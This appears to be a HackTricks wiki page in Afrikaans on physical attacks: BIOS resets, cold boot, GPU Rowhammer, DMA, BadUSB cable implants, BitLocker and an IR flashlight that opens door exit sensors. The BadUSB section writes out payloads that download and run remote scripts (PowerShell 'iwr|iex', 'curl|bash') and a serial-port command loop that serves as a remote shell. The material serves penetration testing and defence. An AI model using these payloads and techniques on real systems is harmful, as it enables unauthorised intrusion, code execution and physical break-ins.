# Fisiese Aanvalle

{{#include ../banners/hacktricks-training.md}}

Vir ontdekking van koppelvlakke op bordvlak, seriële konsoles, flitsgeheuertoegang, newekanaalaanvalle en glitching, gebruik [Hardware Hacking](hardware-hacking/README.md) en die hoofstukke oor spesifieke koppelvlakke. Hierdie bladsy dek aanvalle wat fisiese toegang tot die stelsel as geheel vereis.

## BIOS-wagwoordherwinning en stelselsekuriteit

Instellings van ouer PC-firmware kan teruggestel word deur die CMOS-battery te ontkoppel of ’n gedokumenteerde CMOS-skoonmaakjumper te gebruik. Die vereiste tyd sonder krag hang van die bord af, en moderne UEFI-wagwoorde of -sleutels kan in nie-vlugtige flitsgeheue, ’n ingebedde beheerder of ’n sekuriteitstoestel gestoor word en dus ’n batteryverwydering oorleef. Raadpleeg die bord-/dienshandleiding voordat jy penne kortsluit; hierdie prosedure kan ook TPM-metings ongeldig maak en skyfenkripsieherstel aktiveer.

Op ouer x86-stelsels kan nutsprogramme soos **killCMOS** en **CmosPwd** CMOS-gesteunde instellings vanuit ’n selflaaibare omgewing inspekteer of verander. CmosPwd herken wagwoordformate van ’n gedokumenteerde stel ouer BIOS-families en kan CMOS-toestand rugsteun, herstel of uitvee/vernietig; die gepubliseerde weergawes is gemik op ouer DOS/Windows-, Linux-, FreeBSD- en NetBSD-omgewings.<sup>[[18]](#references)</sup> Hierdie nutsprogramme is nie algemene UEFI-wagwoordverwyderaars nie en vereis voldoende hardeware-/firmwaretoegang.

Sommige skootrekenaarfirmware vertoon ’n verskafferspesifieke uitdagingkode ná verskeie mislukte wagwoordpogings. Databasisse soos [bios-pw.org](https://bios-pw.org) kan ouer verskaffers se herstelwagwoorde vir sommige modelle aflei, maar baie stelsels sluit toegang sonder ’n afleibare uitdaging uit. Behandel enige gegenereerde wagwoord as modelspesifiek en vermy die uitputting van permanente pogingtellers.

### UEFI-sekuriteit

Vir moderne **UEFI**-stelsels kan CHIPSEC Secure Boot-veranderlikebeskermings oudit. Begin met die nie-wysigende kontrole hieronder; die opsionele `-a modify`-modus probeer doelbewus veranderlikes beskadig en moet slegs op ’n herstelbare laboratoriumstelsel gebruik word. CHIPSEC waarsku self dat sy bevoorregte drywer en laevlak-hardewaretoegang nie geskik is vir produksie-eindpunte nie.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM-ontleding en Cold Boot-aanvalle

DRAM verloor nie onmiddellik elke bis wanneer verfrissing stop nie. Die vervaltempo wissel aansienlik na gelang van moduletegnologie en temperatuur; verkoeling kan bruikbare data veel langer bewaar as ’n onverkoelde kragsiklus. ’n Cold-boot-aanval herlaai die stelsel vinnig na ’n klein verkrygingsomgewing, of dra ’n verkoelde module oor, neem ’n rou geheuestorting vas en herkonstrueer kriptografiese sleutels ondanks bisverval. ’n Skyfkopiehulpmiddel is nie outomaties ’n fisiese-geheuestortingshulpmiddel nie, en Volatility ontleed ’n vaslegging eerder as om dit te verkry; gebruik ’n platformgepaste, bekragtigde verkrygingshulpmiddel.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer teen bladsytafels

Moderne GPU Rowhammer-aanvalle word baie nuttiger wanneer hulle **GPU-virtuele-geheue-metadata** teiken in plaas van gewone buffers. Onlangse navorsing oor **GDDR6 NVIDIA Ampere-GPU's** toon dat ’n aanvaller wat CUDA-kode sonder bevoorregte toegang uitvoer, GPU-spesifieke hammering-patrone kan bou, **memory massaging** kan gebruik om bladsysystrukture in kwesbare rye te plaas, en dan bisse in die **laastevlakbladsytafel** of ’n intermediêre **bladsygids** kan omkeer. Sodra ’n enkele vertaallysinskrywing beskadig is, kan die aanvaller **arbitrêre GPU-geheue lees/skryf** bewerkstellig en dan na ’n kompromittering van die gasheerstelsel oorskakel.<sup>[[1]](#references)[[2]](#references)</sup>

### Ontginningspatroon

1. **Profileer rye wat gehammer kan word** in GDDR6 en bou verfrissingsbewuste/nie-eenvormige hammering-patrone wat in-DRAM-versagtings omseil.
2. **Manipuleer GPU-toekennings** sodat die drywer vertaalsystrukture in hammerbare fisiese liggings plaas, eerder as om dit in die verstekbeskermde poel te hou. In die praktyk kan dit beteken dat die laegeheue-bladsytafelgebied uitgeput word en dat groot yl UVM-toekennings met beheerde afstande versprei word.
3. **Keer vertaalmetadata om**, soos **PFN**- of openingverwante bisse in ’n bladsytafel-/bladsygidsinskrywing, sodat die aanvallerbeheerde virtuele bladsy na bladsytafelbladsye, arbitrêre GPU-geheue of gasheersigbare stelseltoekennings verwys.
4. Hergebruik die vervalste toewysing om bykomende vertaalinskrywings te herskryf en na **arbitrêre GPU-geheue lees/skryf** oor GPU-kontekste heen te eskaleer.

### Oorskakeling na die gasheerstelsel en versagtings

- Met **IOMMU gedeaktiveer** kan vervalste stelselopenings-toewysings arbitrêre **fisiese gasheergeheue** aan die GPU blootstel, wat die GPU-primitief in ’n volledige kompromittering van die gasheerstelsel omskep.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** teiken laastevlakbladsytafelinskrywings, terwyl **GeForge** toon dat dit makliker kan wees om ’n bladsygidssvlak te beskadig, omdat een bisomkering ’n groter vertaalsubboom kan herlei. Moenie slegs een bladsysylaag as sekuriteitskritiek beskou nie.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bly belangrik omdat dit die direkte pad na arbitrêre gasheergeheue blokkeer wat GDDRHammer/GeForge gebruik, maar dit is **nie ’n volledige versagting nie**. **GPUBreach** toon ’n tweede-fase-oorskakeling waarin die aanvaller GPU-skryfbare, deur die drywer besitte SVE-buffers beskadig en dan NVIDIA-drywergeheueveiligheidsfoute aktiveer om ’n kernskryfprimitief en ’n **root-shell** te verkry, selfs wanneer IOMMU geaktiveer is.<sup>[[3]](#references)</sup>
- **Stelselvlak-ECC** is ’n praktiese verhardingsmaatreël op ondersteunde werkstasie-/bediener-GPU's. Verbruikers-GPU's sonder ECC bied ’n swakker verdedigingsoppervlak.<sup>[[4]](#references)</sup>
- Hierdie aanvalle is nie bloot teoreties nie: **GeForge** het **1,171** bisomkerings op ’n RTX 3060 en **202** op ’n RTX A6000 gerapporteer, genoeg om ’n werkende eskalasieketting na gasheervoorregte te bou.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direkte geheuetoegang-aanvalle (DMA)

Vir vanlyn UEFI IFR/NVRAM-pleisterwerk wat IOMMU-afdwinging voor selflaai kan afgradeer en ’n Windows DMA-ketting kan moontlik maak, sien:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstreer **DMA-gebaseerde geheueverkryging en -pleisterwerk** oor koppelvlakke soos FireWire en vroeë Thunderbolt-konfigurasies, insluitend historiese aanmeldingsomseilhandtekeninge. Dit is nie bloot “oneffektief teen Windows 10” nie: uitbuitbaarheid hang af van die koppelvlak, teikenbouweergawe, IOMMU-beleid, sluittoestand en of Windows Kernel DMA Protection ondersteun en geaktiveer is. Windows 10 weergawe 1803 en later het Kernel DMA Protection op versoenbare platforms bekendgestel, wat die aanvalsoppervlak aansienlik verander het.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB vir stelseltoegang

Op ’n ongeënkripteerde of reeds ontsluite Windows-volume kan ’n vanlyn omgewing toeganklikheidsbinaries soos **sethc.exe** of **Utilman.exe** met **cmd.exe** vervang, wat ’n SYSTEM-opdragprompt oplewer wanneer die ooreenstemmende kortpad op die aanmeldskerm gebruik word. Hulpmiddels soos **chntpw** kan plaaslike SAM-rekeningdata wysig. Hierdie metodes omseil nie ’n geslote BitLocker-volume nie en kan geloofsbriewe beskadig wat deur DPAPI/EFS beskerm word; bewaar forensiese kopieë en rugsteune.

**Kon-Boot** is ’n kommersiële hulpmiddel om verifikasie tydens selflaai te omseil op ondersteunde Windows-/macOS-konfigurasies. Verenigbaarheid hang af van die bedryfstelsel, firmwaremodus, Secure Boot en skyfenkripsie-opstelling; dit dekripteer nie ’n BitLocker-geslote volume nie.<sup>[[10]](#references)</sup>

---

## Hantering van Windows-sekuriteitskenmerke

### Kortpaaie vir selflaai en herstel

- **Delete/Supr**, F2, F10 of ’n ander vervaardigersleutel kan firmware-opstelling oopmaak.
- **F8** open verouderde Windows-gevorderde selflaaiopsies slegs op konfigurasies waar dié roete steeds geaktiveer is; die huidige hersteltoegang wissel.
- As **Shift** ingehou word, kan dit Windows-outomatiese aanmelding in sommige konfigurasies onderdruk, hoewel beleids-/registerinstellings daardie gedrag kan deaktiveer.<sup>[[17]](#references)</sup>

### BAD USB-toestelle

Toestelle soos **USB Rubber Ducky** en Teensy-borde kan as vertroude HID-sleutelborde geïdentifiseer word en voorafbepaalde toetsaanslae invoer. Die loonvrag het aanvanklik die voorregte en lessenaartoegang van die aangemelde sessie; UAC-aanwysings, skermsluiting, sleutelborduitleg, tydsberekening en USB-beleid op eindpunte beperk dit steeds.<sup>[[15]](#references)</sup>

Programmeerbare randtoestelle kan ook gasheerkernontleders aanval en verskeie USB-toestelle koördineer vir heap grooming en inligtingsopenbaarmaking:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Vir ’n Windows UAS-massaberging-ontledergeval, sien:

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

Administrateur- of rugsteunvoorregte kan gebruik word om ’n skadukopie te skep of registerkorwe te stoor, sodat geslote lêers soos **SAM** en **SYSTEM** verkry kan word. Dit is ’n insamelingstegniek ná kompromittering, nie ’n voorregomseiling nie, en moet met `diskshadow`-/VSS- en registerkru-uitvoer-gebeure gekorreleer word.

## BadUSB-/HID-inplantingstegnieke

### NFC-geaktiveerde Android-HID-toestel

’n Android-foon met root-toegang kan slegs ’n programmeerbare USB-sleutelbord word wanneer sy USB-beheerder en kern **USB gadget/HID-ondersteuning** bied. Op versoenbare toestelle bied Kali NetHunter gadget-profiele deur **USB Arsenal**. Nog ’n opsie is [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), wat ConfigFS-gadgetfunksies skep en karaktertoestelle vir sleutelbord/muis soos `/dev/hidg0` en `/dev/hidg1` kan blootstel. Die hulpmiddel skep slegs die gadget-eindpunt; ’n afsonderlike proses moet HID-verslae daarheen skryf. Root-toegang kan nie vergoed vir ’n kern wat ConfigFS, HID-gadgetondersteuning of ’n bruikbare USB Device Controller kort nie.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Hierdie eindpunt kan met Android NFC as ’n fisiese sneller gekombineer word. Die [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)-toepassing lees ’n merker-UID, skakel dit om na die verwagte voorstelling, kontroleer ’n plaaslike witlys en stuur ná ’n passing ’n gekonfigureerde Rubber Ducky-styl-sleutelbordvolgorde. Die gekoppelde gasheer sien gewone sleutelbordinvoer en benodig geen NFC-sagteware nie.<sup>[[22]](#references)[[24]](#references)</sup>

Bevestig toestelidentifisering en sleutelborduitleg in ’n leë teksredigeerder voordat kortpaaie of opdragte gebruik word. ’n Skadelose loonvrag is:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Belangrike vertrouensgrense:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- ’n **UID whitelist is identifikasie, nie authentication nie**. UID’s is publiek, en sommige token-tipes of emulators laat cloning of impersonation toe. ’n Gekopieerde toegelate UID volg dieselfde dispatch-pad as die oorspronklike token.
- Die **NfcScreenOff** Magisk-module pas die NFC-diens aan sodat dit optree asof die skerm aan en ontsluit is. As die foon reeds aan ’n host gekoppel is, kan dit iemand in staat stel om die payload te aktiveer sonder om die foon te ontsluit.
- Wagwoorde, API-tokens en opdragte wat in die payload gestoor word, is herwinbare geheime op ’n rooted toestel of ’n toestel met ’n ontsluite bootloader. Om ’n wagwoord via HID te tik, is outomatisering met ’n herbruikbare wagwoord, nie passwordless authentication nie.
- HID-inspuiting gebruik die aktiewe desktop se regte en is afhanklik van fokus, tydsberekening en die host se sleutelborduitleg. Vereis onlangse bevestiging van die gebruiker voordat sensitiewe aksies gestuur word, vermy bevoorregte geheime in scripts, en gebruik ’n kriptografiese challenge-response-authenticator vir werklike authentication.

### Wi-Fi-bestuurde kabel-implants

- ESP32-S3-gebaseerde implants soos **Evil Crow Cable Wind** skuil in USB-A→USB-C- of USB-C↔USB-C-kabels, word uitsluitlik as ’n USB-sleutelbord geïdentifiseer, en stel hul C2-stack oor Wi-Fi beskikbaar. Die operateur hoef net die kabel van die slagoffer se host af van krag te voorsien, ’n hotspot met die naam `Evil Crow Cable Wind` en die wagwoord `123456789` te skep, en na [http://cable-wind.local/](http://cable-wind.local/) (of sy DHCP-adres) te blaai om toegang tot die ingebedde HTTP-koppelvlak te kry.<sup>[[8]](#references)</sup>
- Die blaaier-UI bied oortjies vir *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* en *Config*. Gestoorde payloads word volgens bedryfstelsel gemerk, sleutelborduitlegte word intyds omgeskakel, en VID/PID-stringe kan verander word om bekende randtoestelle na te boots.
- Omdat die C2 binne die kabel is, kan ’n foon payloads gereedmaak, uitvoering aktiveer en Wi-Fi-bewyse bestuur sonder om die organisasie se netwerk te gebruik—nuttig vir fisiese indringings met ’n kort verblyftyd.

### OS-bewuste AutoExec-payloads

- AutoExec-reëls koppel een of meer payloads wat onmiddellik ná USB-enumerasie uitgevoer word. Die implant voer liggewig OS-fingerprinting uit en kies die ooreenstemmende script.
- Voorbeeldwerkvloei:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) of `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Omdat uitvoering sonder toesig plaasvind, kan die blote omruiling van ’n laaikabel “plug-and-pwn”-aanvanklike toegang in die konteks van die aangemelde gebruiker bewerkstellig.

### HID-geïnisieerde remote shell oor Wi-Fi TCP

1. **Keystroke-bootstrap:** ’n Gestoorde payload maak ’n konsole oop en plak ’n lus wat alles uitvoer wat op die nuwe USB-reekstoestel aankom. ’n Minimale Windows-variant is:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Die implant hou die USB CDC-kanaal oop terwyl sy ESP32-S3 ’n TCP-kliënt (Python-script, Android APK of desktop-uitvoerbare lêer) na die operateur begin. Enige grepe wat in die TCP-sessie ingetik word, word na die seriële lus hierbo aangestuur, wat afstandbeheerbare opdraguitvoering moontlik maak, selfs op air-gapped gashere. Uitvoer is beperk, dus voer operateurs gewoonlik opdragte blindelings uit (rekeningaanmaak, bykomende nutsmiddels gereedmaak, ens.).

### HTTP OTA-opdateringsoppervlak

- Die gedokumenteerde Evil Crow Cable Wind-koppelvlak stel ’n ongeverifieerde firmware-opdateringsendpoint by `/update` bloot:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Veldoperateurs kan funksies midde-insette warm omruil (bv. USB Army Knife-firmware flits) sonder om die kabel oop te maak, sodat die implant na nuwe vermoëns kan oorskakel terwyl dit steeds by die teikenhost ingeprop is.

## BitLocker-enkripsie omseil

’n Gemagtigde forensiese verkryging van ’n stelsel wat aan is of onlangs geloop het, kan ’n BitLocker-volumemeester sleutel of verwante sleutelmateriaal bevat terwyl die volume ontsluit is. Kommersiële nutsmiddels soos Elcomsoft Forensic Disk Decryptor en Passware Kit Forensic kan ondersteunde geheuebeelde, hibernasielêers of crash dumps deursoek, maar sukses is nie gewaarborg nie. Moderne Windows enkripteer ook crash dumps wanneer BitLocker geaktiveer is, en ’n gestoorde 48-syfer-herstelwagwoord is ’n ander artefak as ’n volumem sleutel wat in geheue gehou word.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Sosiale manipulasie om ’n herstelsleutel by te voeg

’n Aanvaller wat ’n administrateur oorreed om BitLocker-bestuursopdragte uit te voer, kan ’n herstelwagwoord-, eksterne-sleutel- of ander beskermer byvoeg en dit dan vaslê. ’n Herstelwagwoord kan nie ’n arbitrêre string nulle wees nie: BitLocker se numeriese herstelwagwoorde het ’n gevalideerde 48-syfer-formaat. Die relevante sintaksis vir gemagtigde administrasie is `manage-bde -protectors -add C: -recoverypassword`; lys die gevolglike beskermers met `manage-bde -protectors -get C:`. Monitor die byvoeging van beskermers en verseker dat nuwe herstelmateriaal slegs na goedgekeurde liggings bewaar word.<sup>[[16]](#references)</sup>

---

## Misbruik van onderstelindringing-/onderhoudskakelaars om die BIOS na fabrieksinstellings terug te stel

Baie moderne skootrekenaars en klein-rekenaarvormfaktor-rekenaars sluit ’n **onderstelindringingskakelaar** in wat deur die Embedded Controller (EC) en die BIOS/UEFI-firmware gemonitor word. Hoewel die skakelaar hoofsaaklik ’n waarskuwing moet aktiveer wanneer ’n toestel oopgemaak word, implementeer verskaffers soms ’n **ongedokumenteerde herstelskakeling** wat geaktiveer word wanneer die skakelaar volgens ’n spesifieke patroon omgeskakel word.<sup>[[5]](#references)[[6]](#references)</sup>

### Hoe die aanval werk

1. Die skakelaar is aan ’n **GPIO-onderbreking** op die EC gekoppel.
2. Firmware wat op die EC loop, hou die **tydsberekening en aantal drukke** dop.
3. Wanneer ’n hardgekodeerde patroon herken word, roep die EC ’n *mainboard-reset*-roetine aan wat **die inhoud van die stelsel se NVRAM/CMOS uitwis**.
4. By die volgende selflaai laai die betrokke modelle die teruggestelde firmwaretoestand. Afhangend van die verskaffer en hersiening kan die gewiste toestand ’n toesighouerwagwoord, pasgemaakte selflaaiinstellings of ingeskrewe Secure Boot-sleutels insluit; die TPM-toestand en gevolge vir skyfenkripsie moet afsonderlik beoordeel word.

> ’n Firmwareterugstelling kan selflaaiopsies vanaf eksterne media herstel, maar dit **dekripteer nie berging nie**. BitLocker of ’n ander volskyfenkripsiestelsel kan ná TPM-/firmwareveranderinge na herstelmodus oorgaan en steeds die interne skyf beskerm sonder ’n herstelsleutel.<sup>[[16]](#references)</sup>

### Werklike voorbeeld – Framework 13-skootrekenaar

Die herstelskakeling vir die Framework 13 (11de/12de/13de generasie) is:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Na die tiende siklus stel die EC ’n vlag wat die BIOS opdrag gee om NVRAM by die volgende herlaai uit te vee. Die hele prosedure neem sowat 40 s en vereis **niks behalwe ’n skroewedraaier nie**.<sup>[[5]](#references)</sup>

### Generiese uitbuitingsprosedure

1. Skakel die teiken aan of hervat dit uit slaapmodus sodat die EC loop.
2. Verwyder die onderste deksel om toegang tot die inbraak-/instandhoudingskakelaar te kry.
3. Herhaal die vervaardigerspesifieke wisselpatroon (raadpleeg dokumentasie of forums, of reverse-engineer die EC-firmware).
4. Sit die toestel weer aanmekaar en herlaai dit; ondersoek dan watter firmware-instellings en geloofsbriewe werklik verander het.
5. Indien dit gemagtig is en eksterne selflaai beskikbaar is, selflaai vanaf ’n beheerde live-image. Sodra ’n interne volume wettiglik ontsluit is (of as dit nooit geënkripteer was nie), kan die live-omgewing geloofsbriewe en data verkry, of die EFI System Partition ondersoek. Om daardie partisie te wysig om ’n EFI-implantaat te installeer, is volhardend en hoogs indringend, en word steeds beperk deur Secure Boot, measured boot, firmware-skryfbeskerming en eindpuntmonitering. Geënkripteerde berging bly ontoeganklik sonder die sleutel of herstelmateriaal.

### Opsporing en versagting

* Teken onderstel-inbraakgebeurtenisse in die OS-bestuurskonsole aan en korreleer dit met onverwagte BIOS-terugstellings.
* Gebruik **seëls wat tekens van peuterwerk wys** op skroewe/deksels om te bespeur wanneer dit oopgemaak is.
* Hou toestelle in **fisies beheerde areas**; aanvaar dat fisiese toegang gelykstaan aan volledige kompromittering.
* Waar beskikbaar, deaktiveer die vervaardiger se “maintenance switch reset”-funksie of vereis bykomende kriptografiese magtiging vir NVRAM-terugstellings.

---

## Verborge IR-inspuiting teen uitgangsensors sonder aanraking

### Sensoreienskappe
- Algemene “wave-to-exit”-sensors kombineer ’n naby-IR-LED-sender met ’n TV-afstandbeheeragtige ontvangermodule wat slegs ’n logiese hoë sein rapporteer nadat dit verskeie pulse (~4–10) van die korrekte draer (≈30 kHz) ontvang het.<sup>[[7]](#references)</sup>
- ’n Plastiekomhulsel keer dat die sender en ontvanger direk na mekaar kyk, sodat die beheerder aanneem dat enige gevalideerde draer van ’n weerkaatsing naby gekom het, en ’n aflos aktiveer wat die deursluitplaat oopmaak.
- Sodra die beheerder glo dat ’n teiken teenwoordig is, verander dit dikwels die uitgaande modulasie-omhulsel, maar die ontvanger aanvaar steeds enige sarsie wat by die gefiltreerde draer pas.

### Aanvalswerkvloei
1. **Neem die uitstraalprofiel op** – koppel ’n logikaanaliseerder aan die beheerderpenne om die golfvorms voor en ná opsporing op te neem wat die interne IR-LED aandryf.
2. **Speel slegs die “ná-opsporings”-golfvorm af** – verwyder/ignoreer die oorspronklike sender en dryf ’n eksterne IR-LED met die reeds-geaktiveerde patroon van die begin af. Omdat die ontvanger net omgee vir die pulstelling/-frekwensie, beskou dit die vervalste draer as ’n egte weerkaatsing en aktiveer dit die afloslyn.
3. **Beheer die transmissie** – stuur die draer in ingestelde sarsies (bv. tiene millisekondes aan, ongeveer dieselfde tyd af) om die minimum pulstelling te lewer sonder om die ontvanger se AGC of steuringshanteringslogika te oorlaai. Deurlopende uitstraling maak die sensor vinnig minder sensitief en keer dat die aflos aktiveer.

### Langafstand-weerkaatsingsinspuiting
- Deur die werkbank-LED met ’n hoëkrag-IR-diode, MOSFET-drywer en fokusoptika te vervang, kan die sensor betroubaar vanaf ~6 m geaktiveer word.
- Die aanvaller het nie ’n direkte siglyn na die ontvangeropening nodig nie; deur die straal op binnemure, rakke of deurkosyne te rig wat deur glas sigbaar is, kan weerkaatste energie die gesigsveld van ~30° binnegaan en ’n handbeweging van naby naboots.
- Omdat die ontvangers slegs swak weerkaatsings verwag, kan ’n veel sterker eksterne straal van verskeie oppervlaktes weerkaats en steeds bo die opsporingsdrempel bly.

### Gewapende aanvalflitslig
- Deur die drywer in ’n kommersiële flitslig in te bou, word die instrument in die oog versteek. Vervang die sigbare LED met ’n hoëkrag-IR-LED wat by die ontvanger se band pas, voeg ’n ATtiny412 (of soortgelyk) by om die ≈30 kHz-sarsies te genereer, en gebruik ’n MOSFET om die LED-stroom af te voer.
- ’n Teleskopiese zoomlens maak die straal nouer vir reikafstand/akkuraatheid, terwyl ’n vibrasiemotor onder MCU-beheer haptiese bevestiging gee dat modulasie aktief is sonder om sigbare lig uit te straal.
- Deur verskeie gestoorde modulasiepatrone (effens verskillende draerfrekwensies en omhulsels) te deurloop, word versoenbaarheid oor herbenoemde sensorfamilies heen verbeter. Dit laat die operateur toe om weerkaatsende oppervlaktes af te tas totdat die aflos hoorbaar klik en die deur oopgaan.

---

## References

- [1] [GDDRHammer: Ry-Rowhammer-aanvalle van moderne GPU’s wat DRAM-rye grootliks versteur — Rowhammer-aanvalle oor komponente heen](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR-geheue hamer om GPU-bladsytabelle vir pret en wins te vervals](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Voorreg-eskalasie-aanvalle op GPU’s met Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Sekuriteitskennisgewing: Rowhammer - Julie 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Druk hier om te pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Gids vir terugstelling van die moederbord](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Neeeee! Raak nie! – Om IR-uitgangsensors sonder aanraking met ’n verborge IR-flitslig te omseil”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Koppel in, speel, pwn: Inbraak met Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer-aanval teen NVIDIA-skyfies](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Amptelike Kon-Boot-dokumentasie en versoenbaarheidsinligting](https://kon-boot.com/)
- [11] [CHIPSEC-dokumentasie - Secure Boot-veranderlikebeskerming](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Laat ons nie vergeet nie: Cold Boot-aanvalle op enkripsiesleutels](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - fisiese geheuemanipulasie oor DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA-beskerming](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky-dokumentasie](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker-bedryfsgids](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - gedrag van Shift-inhou en outomatiese aanmelding](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd-dokumentasie en aflaaie](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux-dokumentasie - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux-kerneldokumentasie - USB HID-gadgetbestuurder](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-na-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Verander ’n Android-foon met root-toegang in ’n NFC-outentiseerder en outomatiseringsinstrument vir jou rekenaar](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
